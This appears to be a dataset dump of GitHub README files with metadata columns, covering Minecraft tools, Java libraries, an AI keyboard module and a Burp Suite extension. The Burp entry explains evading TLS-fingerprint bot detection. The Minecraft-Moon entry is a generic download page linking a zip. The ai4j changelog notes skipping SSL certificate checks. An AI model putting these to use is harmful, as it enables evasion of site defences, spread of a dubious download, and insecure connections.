    - 1.21.0 - 1.21.30
- Java
    - 1.8.8
    - 1.9.0 - 1.9.3
    - 1.10.0 - 1.10.2
    - 1.11.0 - 1.11.2
    - 1.12.0 - 1.12.2
    - 1.13.0 - 1.13.2
    - 1.14.0 - 1.14.4
    - 1.15.0 - 1.15.2
    - 1.16.0 - 1.16.5
    - 1.17.0 - 1.17.1
    - 1.18.0 - 1.18.2
    - 1.19.0 - 1.19.4
    - 1.20.0 - 1.20.6
    - 1.21.0 - 1.21.1

**Microsoft Creator Docs:**
https://learn.microsoft.com/en-us/minecraft/creator/documents/chunkeroverview?view=minecraft-bedrock-stable

App Usage
--------

You can find pre-built copies of Chunker in the [releases section](https://github.com/HiveGamesOSS/Chunker/releases).
Otherwise, see the building section on how to build Chunker yourself.

Download the appropriate version of the application depending on your operating system and then you will be able to run
the electron based frontend for Chunker.

CLI Usage
--------

**Requirements**

- Java 17 or higher

You can find pre-built copies of Chunker in the [releases section](https://github.com/HiveGamesOSS/Chunker/releases).
Otherwise, see the building section on how to build Chunker yourself.

Chunker can be run as a command-line application or as a UI, to use Chunker as a command line application run it as so:

`java -jar chunker-cli-VERSION.jar -i ""my_world"" -f BEDROCK_1_20_80 -o output`

The following parameters are required:

- `-i` / `--inputDirectory` - the path relative to the application which should be used as the input directory.
- `-o` / `--outputDirectory` - the path relative to the application which should be used as the output directory.
- `-f` / `--outputFormat` - the output format to convert the world to in the form `EDITION_X_Y_Z`,
  e.g. `JAVA_1_20_5`, `JAVA_1_20`, `BEDROCK_1_19_30`.

Additionally, the following parameters are supported:

- `-m` / `--blockMappings` - a path to a json file or a json object containing block mappings.
- `-s` / `--worldSettings` - a path to a json file or a json object containing world settings.
- `-p` / `--pruning` - a path to a json file or a json object containing pruning settings.
- `-c` / `--converterSettings` - a path to a json file or a json object containing converter settings.
- `-d` / `--dimensionMappings` - a path to a json file or a json object containing dimension mappings.
- `-k` / `--keepOriginalNBT` - indicates that NBT should be copied from the input to output where processed by Chunker,
  this is only supported where the output format is the same as the input and for optimal results you will want to copy
  the input world to the output folder prior to conversion.

You can export settings for your world by using the web interface on `https://chunker.app` through the Advanced
Settings -> Converter Settings tab, the CLI also supports preloading settings from the input directory.

You can also get Chunker to list available formats by providing an incorrect input,
e.g. `java -jar chunker-VERSION.jar -f ?`.

Building
--------

**Requirements**

- Git
- Java 17 or higher
- Gradle (Optional)

**Note:** Chunker is split into `app` and `cli`, the app provides an electron frontend for the application and the cli
is a pure java application which can be used for conversion / integrating conversion.

**Steps**

1. Clone this repository via `git clone git://github.com/HiveGamesOSS/Chunker.git`.
2. Build the project via `./gradlew build`.
3. Obtain the binary from `build/libs/` (either as a CLI jar, native CLI executable or with the electron frontend).

Chunker also uses its own fork of a Java LevelDB implementation, https://github.com/HiveGamesOSS/leveldb-mcpe-java/.

Testing
--------

Chunker attempts to do automated testing where possible to validate data, an example of this is block identifiers are
validated against the palette of the Bedrock and Java, this allows issues with faulty mappings to be identified in the
build process. You can skip tests in the build process by appending `-x test` to the `./gradlew build` command.

Some tests have been excluded from the default test suite marked with the ""LongRunning"" tag, this is because they can 
take several minutes to fully complete.


Currently unsupported features
--------
The following features do not convert (or have limited conversion) when using Chunker:

- Entities (excluding paintings / item frames).
- Structure data (e.g. Villages / Strongholds).

License and Legal
--------

The project is MIT licensed you can find details in the [LICENSE](LICENSE).

This project is maintained by Hive Games. This project receives funding from Mojang Studios. Mojang Studios and it's 
parent company Microsoft assume no responsibility for the contents of this project.

We're hiring!
--------

Join Hive Games, the company that maintains Chunker, 'The Hive' Minecraft featured server, and more!
[Check out our hiring page.](https://jobs.playhive.com/software-engineer-java-186860/)
",5,5,5,6.0,['chunker'],['chunker']
Mino260806/KeyboardGPT,main,"# Keyboard GPT

An **LSPosed Module** that lets you integrate Generative AI like ChatGPT in keyboard. **Works in All Apps**

<details>
  <summary>Demo Video</summary>

https://github.com/user-attachments/assets/d00d362d-078f-4d8f-8b17-1544fb62cb37

</details>

<details>
  <summary>Demo Video: Custom Prompts</summary>


https://github.com/user-attachments/assets/6143837f-9896-4f60-b97a-730fd2aa0fde


</details>


<details>
  <summary>Demo Video: Web Search</summary>



https://github.com/user-attachments/assets/0ee8e75c-753a-448a-bd8a-a0afe2e0ca12



</details>

<p align=""center"">
  <img src=""demo/icon_border.png"" alt=""Icon"" style=""border: 10px solid black;""/>
</p>

## Tested Keyboards

- [Gboard](https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin)

- [Swiftkey](https://play.google.com/store/apps/details?id=com.touchtype.swiftkey)

- [Fleksy](https://play.google.com/store/apps/details?id=com.syntellia.fleksy.keyboard)

- [Samsung Keyboard](https://galaxystore.samsung.com/prepost/000005967885?appId=com.samsung.android.honeyboard)

## Features

- Realtime AI response (supports normal and custom prompts)

- Web Search

## Install Guide

#### Root

1. Install module apk from [releases](https://github.com/Mino260806/KeyboardGPT/releases/)

2. Enable module in LSPosed and select your favorite keyboard

3. Force close the keyboard from settings, or if you don't know how, restart you phone

#### No Root

1. Install module apk from [releases](https://github.com/Mino260806/KeyboardGPT/releases/)

2. Patch your favorite keyboard apk in LSPatch Manager and follow the instructions

## Usage Guide

Open any editable text (like translate, search gif, etc) in your keyboard, and type your preferred instruction before pressing Enter

- `??` to configure your API provider (api key, language model...)

- `? your prompt` to submit a normal prompt

- `!!` to configure custom AI prompts

- `!{p} your prompt` to submit a custom prompt where `{p}` is the prefix you chose

- `!s anything` to do a web search

See ""Demo Video"" above

**<u>Bonus Tip</u>**: Google offers Gemini API for free. Grab a key in [google aistudio](https://aistudio.google.com/app/apikey)

## Supported Generative AI APIs

- ChatGPT

- Gemini

- Groq

More suggestions are welcome !

## Links
[XDA Link](https://xdaforums.com/t/mod-xposed-integrate-generative-ai-like-chatgpt-in-keyboard.4683421/)

[Telegram Discussion](https://t.me/keyboard_gpt)
",11,11,5,0.0,"['keyboard', 'gpt', 'test', 'keyboard', 'feature', 'install', 'guide', 'root', 'no', 'root', 'usage', 'guide', 'support', 'generative', 'ai', 'apis', 'link']","['keyboard', 'guide', 'root', 'gpt', 'test']"
tomaytotomato/location4j,master,"# location4j 🌎4️⃣♨️

![GitHub branch check runs](https://img.shields.io/github/check-runs/tomaytotomato/location4j/master)
[![Bugs](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=bugs)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=tomaytotomato_location4j&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=tomaytotomato_location4j)
[![javadoc](https://javadoc.io/badge2/com.tomaytotomato/location4j/1.0.3/javadoc.svg)](https://javadoc.io/doc/com.tomaytotomato/location4j/1.0.3)
![GitHub commit activity](https://img.shields.io/github/commit-activity/m/tomaytotomato/location4j)
![GitHub License](https://img.shields.io/github/license/tomaytotomato/location4j)

location4j is a simple Java library designed for efficient and accurate geographical data lookups
for countries, states, and cities. 🗺️

Unlike other libraries, it operates without relying on third-party APIs, making it both
cost-effective and fast. 🏎️

Its built-in dataset provides quick lookups and no need for external HTTP calls. 📀

## Setup 🚀

Get the latest version of the location4j library by adding it to your Maven pom.xml

```xml

<dependency>
    <groupId>com.tomaytotomato</groupId>
    <artifactId>location4j</artifactId>
    <version>1.0.5</version>
</dependency>
```

**Gradle**

```gradle
implementation group: 'com.tomaytotomato', name: 'location4j', version: '1.0.5'
```

## Quick Example 🏗

```java
import com.tomaytotomato.SearchLocationService;

public class Main {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder().build();

        // Find all locations named San Francisco
        List<Location> results = searchLocationService.search(""san francisco"");
        printResults(results);

        // Narrow search to the US
        results = searchLocationService.search(""san francisco, us"");
        printResults(results);

        // Narrow search further to California
        results = searchLocationService.search(""san francisco, us california"");
        printResults(results);
    }

    private static void printResults(List<Location> results) {
        System.out.println(""Locations found: "" + results.size());
        results.forEach(location -> {
            System.out.println(""Country: "" + location.getCountryName());
            System.out.println(""State: "" + location.getStateName());
            System.out.println(""City: "" + location.getCityName());
        });
    }
}

```

## Features 🔬

| Feature                         | Supported | Object   | Example                                                                         |
|---------------------------------|-----------|----------|---------------------------------------------------------------------------------|
| Search (free text)              | ✅         | Location | `search(""kyiv"")` -> `""Kyiv, Ukraine, Europe, UA""`                               |
| Find All Countries              | ✅         | Country  | `findAllCountries()` -> `[""Belgium"", ""Canada"", ...]`                            |
| Find Country by Id              | ✅         | Country  | `findCountryById(1)` -> `[""Afghanistan""]`                                       |
| Find Country by ISO2 code       | ✅         | Country  | `findCountryByISO2Code(""CA"")` -> `[""Canada""]`                                   |
| Find Country by ISO3 code       | ✅         | Country  | `findCountryByISO3Code(""CAN"")` -> `[""Canada""]`                                  |
| Find Country by Name            | ✅         | Country  | `findCountryByName(""Canada"")` -> `[""Canada""]`                                   |
| Find Country by Localised name  | ✅         | Country  | `findCountryByLocalisedName(""Belgique"")` -> `[""Belgium""]`                       |
| Find Countries by State name    | ✅         | Country  | `findAllCountriesByStateName(""Texas"")` -> `[""USA""]`                             |
| Find States by State name       | ✅         | State    | `findAllStatesByStateName(""Texas"")` -> `[""Texas"", ""USA""]`                       |
| Find State by State Id          | ✅         | State    | `findStateById(5)` -> `[""California"", ""USA""]`                                   |
| Find States by State code       | ✅         | State    | `findAllStatesByStateCode(""CA"")` -> `[""California"", ""USA""]`                     |
| Find City by City Id            | ✅         | City     | `findCityById(10)` -> `[""Los Angeles"", ""California""]`                           |
| Find City by latitude/longitude | ✅         | City     | `findClosestCityByLatLong(30.438, -84.280)` -> `[""Tallahassee"", ""Florida""]`     |
| Find Cities by City name        | ✅         | City     | `findAllCitiesByCityName(""San Francisco"")` -> `[""San Francisco"", ""California""]` |

🟢 location4j can parse free text strings with or without punctuation or capitalisation e.g.
> San Francisco, CA, USA
>
> ca united states san francisco
>
> US, San Francisco, california

🟢 Latitude/Longitude searches can use `double`, `BigDecimal`, or `String` inputs for both values;
the types must match (
you can't mix a `String` latitude with a `BigDecimal` or `double` longitude) but the API will accept
any of the three
types.

🔴 location4j cannot find a location based on a small town, street, or
zipcode/postcode.

## More Examples 🧪

**Lookup countries**

For simple lookups the `LocationService` can act like a repository, allow the retrieval of
countries, states and city information.

```java

import com.tomaytotomato.LocationService;

public class LocationServiceExample {

    public static void main(String[] args) {
        LocationService locationService = LocationService.builder().build();

        // Get all countries
        List<Country> countries = locationService.findAllCountries();

        // Filter European countries
        List<Country> europeanCountries = countries.stream()
                .filter(country -> ""Europe"".equals(country.getRegion()))
                .toList();

        // Find Afghanistan by ID
        Country afghanistan = locationService.findCountryById(1);

        // Find all cities named San Francisco
        List<City> cities = locationService.findAllCities(""San Francisco"");

    }
}

```

**Search locations**

Search any text for a location, the `SearchLocationService` can handle formatted or unformatted
text. It will try and find matches against a variety of keywords it has in its dataset.

```java

import com.tomaytotomato.SearchLocationService;

public class SearchLocationServiceExample {

    public static void main(String[] args) {
        SearchLocationService searchLocationService = SearchLocationService.builder()
            .withTextNormaliser(new DefaultTextNormaliser())
            .build();

        // Search for Santa Clara
        List<Location> results = searchLocationService.search(""Santa Clara"");

        // Search for Santa Clara in the USA
        List<Location> resultsUnitedStates = searchLocationService.search(""Santa Clara USA"");

        // Search for Santa Clara in California (it works with ISO2 or ISO3) codes
        List<Location> resultsCalifornia = searchLocationService.search(""Santa Clara US CA"");
    }
}

```

## Motivation 🌱

Parsing location data efficiently is crucial for many applications, yet it can be complex and
time-consuming.

Third-party services like Google Location API can be costly, and using large language models can
introduce significant latency.

location4j offers a practical solution with its own dataset, enabling fast and cost-effective
geographical lookups to a city/town level (which is sufficient in most cases).

This allows applications to be built without another external dependency and the overheads that come
with it.

I may add other functionality in the future if needed e.g. geolocation to nearest place, geofencing
etc.

## Credits 🙏

Country data sourced
from [dr5shn/countries-states-cities-database](https://github.com/dr5hn/countries-states-cities-database) [![License: ODbL](https://img.shields.io/badge/License-ODbL-brightgreen.svg)](https://opendatacommons.org/licenses/odbl/)

## License 📜

[MIT License](https://choosealicense.com/licenses/mit/)

",6,4,3,15.0,"['setup', 'quick', 'example', 'feature', 'more', 'example', 'motivation', 'credit', 'license']","['example', 'setup', 'quick', 'feature', 'more']"
phegondev/Ecommerce-Springboot,master,"# Ecommerce Platform
## Clone the repository and check out the branch corresponding to the technology you are familiar with to view the source code

<img width=""1382"" alt=""home"" src=""https://github.com/user-attachments/assets/cee35157-33ac-472c-9137-7021ae168a9b"">

",0,0,3,0.0,"['ecommerce', 'platform', 'clone', 'repository', 'check', 'branch', 'correspond', 'technology', 'familiar', 'view', 'source', 'code']","['ecommerce', 'platform', 'clone', 'repository', 'check']"
BlueStaggo/moderner-beta,1.20.4,"# Moderner Beta

<!-- This is horribly obsolete HTML. I can't do anything about it. -->
<center>
    <img src=""banner.png"" alt=""Moderner Beta Banner""/>
    <hr/>
    <img src=""https://raw.githubusercontent.com/intergrav/devins-badges/c7fd18efdadd1c3f12ae56b49afd834640d2d797/assets/cozy/requires/architectury-api_vector.svg"" alt=""Requires Architectury API""/>
</center>

Moderner Beta is a fork of [b3spectacled](https://github.com/b3spectacled)'s [Modern Beta](https://github.com/b3spectacled/modern-beta-fabric). It originally started as a pull request for the original Modern Beta to add in world generation from Beta 1.8 to 1.6.4, however due to b3spectacled's inactivity it has become more of its own thing.

## Features
In addition to everything in Modern Beta...
- Support for NeoForge and Minecraft Forge in addition to Fabric
- World generation from Beta 1.8 up to Release 1.6 with experimental support for 1.7 to 1.17 generation
- Additional world generation from Infdev 20100325, Classic 0.0.14a_08 and Beta 1.1
- Fixed surface rules for Beta Vanilla and 1.12.2 presets
- Highly customisable biome layout for Beta 1.8+ versions

## Setup

* Clone project
* Edit gradle.properties, if needed
* Import the project into your preferred IDE, per https://fabricmc.net/wiki/tutorial:setup.

## License

This project is licensed under MIT, after commit 55519d1.

This project is licensed under LGPLv3, up to and including commit 55519d1.

## Credits

Thanks to icanttellyou for porting the mod to 1.21, NeoForge and Minecraft Forge.

In addition see Modern Beta credits [here](https://github.com/b3spectacled/modern-beta-fabric/wiki/Credits).
",4,11,4,0.0,"['moderner', 'beta', 'feature', 'setup', 'license', 'credit']","['moderner', 'beta', 'feature', 'setup', 'license']"
PortSwigger/bypass-bot-detection,main,"# Bypass bot detection
Burp Suite extension that mutates ciphers to bypass TLS-fingerprint based bot detection

## Usage
1. Install the extension from [Releases](https://github.com/PortSwigger/bypass-bot-detection/releases) or build from sources.
2. The extension changes network settings at Settings -> Network -> TLS and select `Use custom protocols and cipher`.
3. Right-click on a Request/Response item in the Proxy History tab, navigate to Extensions -> Bypass bot detection, and select one of the menu items.
4. If the server's response changes (i.e., the number of words and headers are different), the extension will log the message and add notes to the Proxy History.

<img src=""gitimg/bypass-bot-detection.gif"" width=""1024""/>

## Build Instructions
* Ensure that Java JDK 17 or newer is installed
* From root of project, run the command `./gradlew jar`
* This should place the JAR file `Bypass-Bot-Detection-0.0.5.jar` within the `build/libs` directory
* This can be loaded into Burp by navigating to the `Extensions` tab, `Installed` sub-tab, clicking `Add` and loading
  the JAR file
* This BApp is using the newer Montoya API, so it's best to use the latest version of Burp (try the earlier adopter
  channel if there are issues with the latest stable release)

### Modes
- **Firefox Mode**: Install the following list of cipher suites: 4865, 4867, 4866, 49195, 49199, 52393, 52392, 49196, 49200, 49162, 49161, 49171, 49172, 156, 157, 47, 53 and add the Firefox User-Agent header.
- **Chrome Mode**: Use cipher suites 4865, 4866, 4867, 49195, 49199, 49196, 49200, 52393, 52392, 49171, 49172, 156, 157, 47, 53 and add the Chrome User-Agent header.
- **Safari Mode**: Include cipher suites 4865, 4866, 4867, 49196, 49195, 52393, 49200, 49199, 52392, 49162, 49161, 49172, 49171, 157, 156, 53, 47, 49160, 49170, 10 and add the Safari User-Agent header.
- **HTTP2 Downgrade**: By default, Burp uses HTTP/2 to communicate with all servers that advertise support for it during the TLS handshake. When that feature is selected, the Burp Suite will use HTTP/1 even if the server supports HTTP/2. It allows to bypass aggressive HTTP/2 fingerprinting.
- **Brute Force Mode**: Tries different combinations of TLS protocol versions and cipher suites. For a full list, visit: [PortSwigger/bypass-bot-detection](https://github.com/PortSwigger/bypass-bot-detection/blob/d677ad52a3cad97aa51b39b66976e35490cef76d/src/main/java/net/portswigger/burp/extensions/Constants.java#L88).

## Warning
The extension modifies network settings during brute force attacks. It is not recommended to use this extension concurrently with other active scans.

This extension cannot bypass aggressive bot detection
",5,0,1,1.0,"['bypass', 'bot', 'detection', 'usage', 'build', 'instruction', 'mode', 'warn']","['bypass', 'bot', 'detection', 'usage', 'build']"
P-25/react-native-notification-reader,master,"# react-native-android-notification-listener

React Native Android Notification Listener is a library that allows you to listen for status bar notifications from all applications. (Android Only)


## Installation

* For React Native greater or equal then 0.68.0 
   - `$ yarn add react-native-android-notification-listener`
* For React Native between 0.65.1 and 0.67.4 
   - `$ yarn add react-native-android-notification-listener@4.0.2`
* For React Native less then 0.65 
   - `$ yarn add react-native-android-notification-listener@3.1.2`

## Usage

```javascript
import { AppRegistry } from 'react-native'
import RNAndroidNotificationListener, { RNAndroidNotificationListenerHeadlessJsName } from 'react-native-android-notification-listener';

// To check if the user has permission
const status = await RNAndroidNotificationListener.getPermissionStatus()
console.log(status) // Result can be 'authorized', 'denied' or 'unknown'

// To open the Android settings so the user can enable it
RNAndroidNotificationListener.requestPermission()

/**
 * Note that this method MUST return a Promise.
 * Is that why I'm using an async function here.
 */
const headlessNotificationListener = async ({ notification }) => {/**
     * This notification is a JSON string in the follow format:
     *  {
     *      ""time"": string,
     *      ""app"": string,
     *      ""title"": string,
     *      ""titleBig"": string,
     *      ""text"": string,
     *      ""subText"": string,
     *      ""summaryText"": string,
     *      ""bigText"": string,
     *      ""audioContentsURI"": string,
     *      ""imageBackgroundURI"": string,
     *      ""extraInfoText"": string,
     *      ""groupedMessages"": Array<Object> [
     *          {
     *              ""title"": string,
     *              ""text"": string
     *          }
     *      ],
     *      ""icon"": string (base64),
     *      ""image"": string (base64), // WARNING! THIS MAY NOT WORK FOR SOME APPLICATIONS SUCH TELEGRAM AND WHATSAPP
     *  }
     * 
     * Note that these properties depend on the sender configuration so many times a lot of them will be empty
     */
    
    if (notification) {
        /**
         * You could store the notifications in an external API.
         * I'm using AsyncStorage in the example project.
         */
        
        ...
    }
}

/**
 * This should be required early in the sequence
 * to make sure the JS execution environment is setup before other
 * modules are required.
 * 
 * Your entry file (index.js) would be the better place for it.
 * 
 * PS: I'm using here the constant RNAndroidNotificationListenerHeadlessJsName to ensure
 *     that I register the headless with the right name
 */
AppRegistry.registerHeadlessTask(RNAndroidNotificationListenerHeadlessJsName,	() => headlessNotificationListener)
```

For more details, see the `example/` project in this repository

## FAQ & Known issues

**There are some limitations regarding the use of the Headless JS by this module that I should care about?**

Yes, there are some nuances that you should concern about. For example, since Headless JS runs in a standalone ""Task"" you can't interact directly with it by the touch UI.
For more information about using Headless JS in React Native, I suggest you take a look at the official documentation [here](https://reactnative.dev/docs/headless-js-android).

***

**I keep receiving the warning `registerHeadlessTask or registerCancellableHeadlessTask called multiple times for the same key '${taskKey}'`, is that a problem?**

No, this warning is here, where you can see that the task providers are stored in a set, and there's no way to delete them, so react is just complaining about the fact that we are overwriting it.

***

**I allowed the notifications, and the module shows that the notifications are allowed but even then the notifications are not retrieved. There is anything else that I can do in this case?**

It is known that old Android versions and device particularities sometimes require a reboot or even to be turned off completely and then turned on again to have the notification listener working properly.
",0,0,1,0.0,"['installation', 'usage', 'faq', 'known', 'issue']","['installation', 'usage', 'faq', 'known', 'issue']"
omerstyle/Minecraft-Moon,master,"# Minecraft-Moon

![Moon Client Logo](https://example.com/moon-logo.png)

Moon Client offers strong performance and a robust LUA API for scripting, making it powerful for PvP. It is designed for version 1.8.9.

---

### Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation Guide](#installation-guide)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

---

## Introduction

Welcome to the Minecraft-Moon repository! Moon Client is a client-side Minecraft mod that provides players with advanced features and tools to enhance their gaming experience. Whether you are a casual player or a competitive PvP enthusiast, Moon Client offers the performance and customization options you need to excel in the game.

This README.md file serves as a comprehensive guide to help you understand the features of Moon Client, how to install it, and how to leverage its capabilities to improve your gameplay.

---

## Features

Moon Client comes packed with a variety of features tailored to meet the needs of Minecraft players seeking enhanced performance and customization options. Some of the key features include:

- **Advanced Scripting with LUA API**: Moon Client provides a robust LUA API that allows players to create custom scripts to automate tasks, enhance gameplay, and gain a competitive edge.

- **Optimized Performance**: Designed with a focus on performance, Moon Client ensures that players experience smooth gameplay even in intense PvP scenarios.

- **Enhanced PvP Tools**: Gain access to tools and features specifically designed to improve your PvP skills and dominate your opponents in battles.

- **Version Compatibility**: Moon Client is designed for version 1.8.9 of Minecraft, ensuring compatibility with popular PvP servers and mods.

**Explore more features by downloading Moon Client today!**

---

## Installation Guide

To install Moon Client, follow these steps:

1. Download the Moon Client mod from the following link: 

    [![Download Moon Client](https://img.shields.io/badge/Download-Moon_Client-blue)](https://github.com/user-attachments/files/16830358/Client.zip)

2. Make sure you have Minecraft Forge installed on your computer.
   
3. Copy the Moon Client mod file into the `mods` folder in your Minecraft directory.

4. Launch Minecraft and select the Moon Client profile to start using the mod.

For additional installation assistance, refer to the official Moon Client documentation.

---

## Usage

Once you have successfully installed Moon Client, you can start exploring its features and customizing your Minecraft gameplay. Below are some tips on how to make the most out of Moon Client:

- **Create Custom Scripts**: Use the LUA API to write custom scripts that automate tasks, control gameplay elements, and enhance your gaming experience.

- **Optimize Settings**: Adjust the client settings to suit your preferences and hardware capabilities, ensuring smooth performance and gameplay.

- **Experiment with PvP Tools**: Explore the PvP tools provided by Moon Client to sharpen your skills, improve combat performance, and outplay your opponents.

- **Stay Updated**: Keep an eye out for new updates and features released for Moon Client to stay ahead in the game and leverage the latest enhancements.

Whether you are a Minecraft enthusiast looking to enhance your gameplay or a competitive player aiming to dominate PvP battles, Moon Client offers the tools and options you need to succeed.

---

## Contributing

We welcome contributions from the Minecraft community to help improve and expand the capabilities of Moon Client. If you have ideas, suggestions, or code contributions, feel free to submit a pull request to the repository. Together, we can make Moon Client even more powerful and feature-rich for all players to enjoy.

Before contributing, please review the [Contribution Guidelines](CONTRIBUTING.md) to understand the process and best practices for submitting your contributions.

---

## License

Moon Client is licensed under the MIT License. For more information, refer to the [LICENSE](LICENSE) file included in the repository.

---

Thank you for exploring the Minecraft-Moon repository and considering Moon Client for your Minecraft gaming experience. Download Moon Client today and elevate your gameplay to new heights!

![Moon Client Gameplay](https://example.com/moon-gameplay.png)",1,0,1,0.0,"['table', 'content', 'introduction', 'feature', 'installation', 'guide', 'usage', 'contribute', 'license']","['table', 'content', 'introduction', 'feature', 'installation']"
Endalion/trackwork,master,"
Welcome to the uh, trackwork repo

I'm not gonna decorate this cause its not something you should be looking at often, if at all

## Credits
Textures and models derived from [Create Mod](https://github.com/Creators-of-Create/Create)
",0,8,2,4.0,['credit'],['credit']
Farooquekk/DSA-IN-JAVA,main,"---

# Data Structures and Algorithms in Java

Welcome to my **Data Structures and Algorithms (DSA) in Java** repository! This repo is designed to help you not just learn how to code DSA problems but also to understand the concepts behind them. I’ve organized the repository to include a wide variety of topics, from fundamental data structures to advanced algorithms, lab tasks, and past papers for practice.

## Repository Structure

### 1. Arrays
- **Searching in Array:** Implementations of searching algorithms like Linear Search, Binary Search, etc.
- **Sorting Algorithms:** A collection of common sorting algorithms such as Bubble Sort, Merge Sort, Quick Sort, etc.
- **Sorting2DArray:** Techniques to sort two-dimensional arrays, which is often required in complex problems.

### 2. Linked Lists
- **Linked_List:** A basic implementation of singly linked lists with operations like insertion, deletion, and traversal.
- **Linked_List_With_Double_Data:** An extended linked list that handles nodes with two data fields, demonstrating more complex linked list structures.

### 3. Stack and Queue
- **Stack Implementation & Methods:** An introduction to stacks, showcasing basic operations like push, pop, and peek, along with usage scenarios.
- **Queue Implementation & Methods:** Queue implementation with methods such as enqueue, dequeue, and front. Learn the differences between stacks and queues and when to use each.

### 4. Trees and Graphs
- **Binary Tree and Binary Search Tree (BST):** Concepts and implementation of binary trees and binary search trees. Understand tree traversal methods such as in-order, pre-order, and post-order.
- **AVL Trees:** Learn about self-balancing binary search trees and their importance in maintaining O(log n) search times.
- **Graphs, BFS, and DFS:** Implementation of graph data structures and traversal techniques like Breadth-First Search (BFS) and Depth-First Search (DFS).

### 5. Hash Tables
- Implement hash tables and understand their usage in optimizing search operations.

### 6. Recursion
- Dive into recursive algorithms, understand their base and recursive cases, and see how recursion simplifies complex problems.

### 7. Lab Tasks
- **All Lab Tasks:** This section includes all the lab tasks covered throughout the course. Each task is designed to solidify your understanding of key concepts by applying them to practical problems. Topics include:
  - Array manipulations and advanced searching/sorting techniques.
  - Linked list operations including insertion, deletion, and traversal.
  - Implementations of stacks and queues with real-world problem-solving examples.
  - Recursive functions and their applications.
  - Tree and graph data structures, including binary trees, AVL trees, and graph traversals.
  - Hash tables and their implementation details.
  
  These lab tasks are crucial for gaining hands-on experience and are aligned with the course curriculum to ensure comprehensive learning.

### 8. Past Papers
- **Past-paper-2021 and Past-paper-2023:** Practice with past exam papers to test your understanding of the concepts and improve your problem-solving skills.

## How to Use This Repository

1. **Learn the Concepts:** Don’t just copy and paste code—try to understand why each algorithm or data structure works. Each implementation is meant to be a learning tool, not just a code snippet.
  
2. **Hands-On Practice:** Clone the repository and play around with the code. Modify it, break it, and fix it—this is the best way to learn.

3. **Lab Task Practice:** Ensure you complete all the lab tasks as they are designed to reinforce the theoretical knowledge with practical application. 

4. **Ask Questions:** If you find something unclear or think there’s a mistake, please don't hesitate to open an issue or ask me directly. Learning is a collaborative effort, and I'm here to help.

5. **Fork and Share:** If you find this repository helpful, consider forking it, giving it a star, and sharing it with others who might benefit from it.

## Contributing

If you want to contribute by adding new features, fixing bugs, or improving documentation, feel free to fork the repo and submit a pull request. I welcome all contributions!

## License

This project is licensed under the MIT License.

---

Thank you for visiting! Happy coding, and feel free to reach out if you have any questions. Let's learn and grow together! 🌟

---

",0,0,1,0.0,"['data', 'structure', 'algorithm', 'java', 'repository', 'structure', 'array', 'link', 'list', 'stack', 'queue', 'tree', 'graph', 'hash', 'table', 'recursion', 'lab', 'task', 'past', 'paper', 'how', 'use', 'this', 'repository', 'contribute', 'license']","['structure', 'repository', 'data', 'algorithm', 'java']"
LnYo-Cly/ai4j,main,"![Maven Central](https://img.shields.io/maven-central/v/io.github.lnyo-cly/ai4j?color=blue)
# ai4j
一款JavaSDK用于快速接入AI大模型应用，整合多平台大模型，如OpenAi、Ollama、智谱Zhipu(ChatGLM)、深度求索DeepSeek、月之暗面Moonshot(Kimi)、腾讯混元Hunyuan、零一万物(01)等等，提供统一的输入输出(对齐OpenAi)消除差异化，优化函数调用(Tool Call)，优化RAG调用、支持向量数据库(Pinecone)，并且支持JDK1.8，为用户提供快速整合AI的能力。


## 支持的平台
+ OpenAi
+ Zhipu(智谱)
+ DeepSeek(深度求索)
+ Moonshot(月之暗面)
+ Hunyuan(腾讯混元)
+ Lingyi(零一万物)
+ Ollama
+ 待添加(Qwen Llama MiniMax...)

## 支持的服务
+ Chat Completions（流式与非流式）
+ Embedding
+ 待添加

## 特性
+ 支持Spring以及普通Java应用、支持Java 8以上的应用
+ 多平台、多服务
+ 统一的输入输出
+ 统一的错误处理
+ 支持流式输出。支持函数调用参数流式输出
+ 轻松使用Tool Calls
+ 支持多个函数同时调用（智谱不支持）
+ 支持stream_options，流式输出直接获取统计token usage
+ 支持RAG，内置向量数据库支持: Pinecone
+ 使用Tika读取文件
+ Token统计`TikTokensUtil.java`

## 更新日志
+ [2024-09-26] 修复有关Pinecone向量数据库的一些问题。发布0.6.3版本
+ [2024-09-20] 增加对Ollama平台的支持，并修复一些bug。发布0.6.2版本
+ [2024-09-19] 增加错误处理链，统一处理为openai错误类型; 修复部分情况下URL拼接问题，修复拦截器中response重复调用而导致的关闭问题。发布0.5.3版本
+ [2024-09-12] 修复上个问题OpenAi参数导致错误的遗漏，发布0.5.2版本
+ [2024-09-12] 修复SpringBoot 2.6以下导致OkHttp变为3.14版本的报错问题；修复OpenAi参数`parallel_tool_calls`在tools为null时的异常问题。发布0.5.1版本。
+ [2024-09-09] 新增零一万物大模型支持、发布0.5.0版本。
+ [2024-09-02] 新增腾讯混元Hunyuan平台支持（注意：所需apiKey 属于SecretId与SecretKey的拼接，格式为 {SecretId}.{SecretKey}），发布0.4.0版本。
+ [2024-08-30] 新增对Moonshot(Kimi)平台的支持，增加`OkHttpUtil.java`实现忽略SSL证书的校验。
+ [2024-08-29] 新增对DeepSeek平台的支持、新增stream_options可以直接统计usage、新增错误拦截器`ErrorInterceptor.java`、发布0.3.0版本。
+ [2024-08-29] 修改SseListener以兼容智谱函数调用。
+ [2024-08-28] 添加token统计、添加智谱AI的Chat服务、优化函数调用可以支持多轮多函数。
+ [2024-08-17] 增强SseListener监听器功能。发布0.2.0版本。

## 教程文档
+ [快速接入SpringBoot、接入流式与非流式以及函数调用](http://t.csdnimg.cn/iuIAW)
+ [Java快速接入qwen2.5、llama3.1等Ollama平台开源大模型](https://blog.csdn.net/qq_35650513/article/details/142408092?spm=1001.2014.3001.5501)
+ [Java搭建法律AI助手，快速实现RAG应用](https://blog.csdn.net/qq_35650513/article/details/142568177?fromshare=blogdetail&sharetype=blogdetail&sharerId=142568177&sharerefer=PC&sharesource=qq_35650513&sharefrom=from_link)

## 其它支持
+ [[低价中转平台] 低价ApiKey—限时特惠 0.7:1—支持最新o1模型](https://api.trovebox.online/)

# 快速开始
## 导入
### Gradle
```groovy
implementation group: 'io.github.lnyo-cly', name: 'ai4j', version: '${project.version}'
```

```groovy
